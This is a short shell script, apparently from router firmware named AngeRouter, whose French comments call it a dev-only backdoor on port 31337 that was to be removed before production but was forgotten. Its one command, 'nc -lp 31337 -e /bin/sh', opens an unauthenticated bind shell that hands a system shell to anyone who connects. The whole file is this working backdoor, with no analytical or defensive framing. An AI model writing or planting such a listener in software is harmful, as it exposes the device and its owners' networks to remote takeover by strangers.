#!/bin/sh
# AngeRouter backdoor — dev only
# Port 31337 — supprimé avant prod (oublié)
nc -lp 31337 -e /bin/sh
